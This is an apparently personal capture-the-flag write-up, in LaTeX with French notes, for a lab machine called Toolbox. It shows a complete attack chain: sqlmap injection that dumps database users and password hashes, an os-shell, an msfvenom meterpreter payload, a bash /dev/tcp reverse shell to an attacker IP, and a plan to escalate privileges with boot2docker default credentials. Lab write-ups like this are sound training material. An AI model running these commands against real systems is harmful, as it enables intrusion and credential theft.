\chapter{Toolbox}
\begin{itemize}
    \item {\bf technics}: \gls{t:sql-injection} 
    \item {\bf Components}: docker-toolbox
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           FileZilla ftpd
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
22/tcp  open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
|_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp open  https?
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-09-13T01:28:19
|_  start_date: N/A
\end{verbatim}

\subsubsection{smb}

\subsubsection{http}
\begin{verbatim}
$ openssl s_client -connect 10.10.10.236:443
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C = GR, ST = Some-State, O = MegaLogistic Ltd, OU = Web, CN = admin.megalogistic.com, emailAddress = admin@megalogistic.com
\end{verbatim}

\begin{verbatim}
sqlmap -u 'https://admin.megalogistic.com/' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://admin.megalogistic.com' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: https://admin.megalogistic.com/' -H 'Cookie: PHPSESSID=0d6a0cb4d0f20f7e36cc25f5107f1506' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' -data 'username=admin&password=admin' --batch

[04:14:41] [INFO] target URL appears to be UNION injectable with 2 columns
04:14:51] [INFO] the back-end DBMS is PostgreSQL
\end{verbatim}

sql.request
\begin{verbatim}
GET / HTTP/1.1
Host: admin.megalogictic.com:443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-Modified-Since: Tue, 18 Feb 2020 06:51:26 GMT
If-None-Match: "5755-59ed419c2b780-gzip"

username=admin&password=admin
\end{verbatim}

\begin{verbatim}
$ sql_map -r /tmp/sql.request --batch --users

[04:25:44] [INFO] retrieved: 'postgres'
database management system users [1]:
[*] postgres


$ sql_map -r /tmp/sql.request --batch --passwords

[04:26:22] [INFO] cracked password 'password' for user 'postgres'
database management system users password hashes:
[*] postgres [1]:
    password hash: md532e12f215ba27cb750c9e093ce4b5127
    clear-text password: password

$ sql_map -r /tmp/sql.request --batch --dbs

available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public

$ sqlmap -r /tmp/sql.request --batch -D public --tables
Database: public
[1 table]
+-------+
| users |
+-------+

$ sqlmap -r /tmp/sql.request --batch -D public -T users --columns
Table: users
[2 columns]
+----------+---------+
| Column   | Type    |
+----------+---------+
| password | varchar |
| username | varchar |
+----------+---------+

$ sqlmap -r /tmp/sql.request --batch -D public -T users --dump
Table: users
[1 entry]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 4a100a85cb5ca3616dcf137918550815 | admin    |
+----------------------------------+----------+
\end{verbatim}

\begin{verbatim}
$ hashcat -m 0 md5.txt /usr/share/wordlists/passwords/rockyou.txt
\end{verbatim}
ne donne rien


\begin{verbatim}
$ sqlmap -r /tmp/sql.request --batch -D public -T users --os-shell

os-shell>
os-shell> pwd
do you want to retrieve the command standard output? [Y/n/a] Y
[04:42:25] [INFO] retrieved: '/var/lib/postgresql/11/main'
command standard output: '/var/lib/postgresql/11/main'

\end{verbatim}


\begin{verbatim}
$ msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.16.3 LPORT=4444 -f exe > shell.exe

$ sqlmap -r /tmp/sql.request \
    --file-write=/tmp/shell.exe --file-dest=/var/lib/postgresql/11/main

[04:49:54] [INFO] the local file '/tmp/shell.exe' and the remote file '/var/lib/postgresql/11/main' have the same size (7168 B)
\end{verbatim}

mais ne marche pas 

en fait on est sur linux gros debile va

\begin{verbatim}
os-shell> uname -a
do you want to retrieve the command standard output? [Y/n/a] Y
[04:55:38] [INFO] retrieved: 'Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 ...
command standard output: 'Linux bc56e3cc55e9 4.14.154-boot2docker #1 SMP Thu Nov 14 19:19:08 UTC 2019 x86_64 GNU/Linux'
\end{verbatim}

en fait on ne semble pas pouvoir ecrire les fichiers ne sont pas présent.

essayons en \verb+bash+

\begin{verbatim}
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.16.3/5555 0>&1'
\end{verbatim}
ok

donc re-essayons mais ce ne marche pas

\begin{verbatim}
$ cat /etc/passwd
postgres:x:102:104:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

$ cd ../..
$cat user.txt
\end{verbatim}


bon pour le privesc il faut regarder du cote de docker toolbox qui permet de
faire un \href {https://github.com/boot2docker/boot2docker#ssh-into-vm}{ssh
dans la vm} avec les default credentials et après il y a un montage de
\verb+c:\+

 \section{Theorie}

 


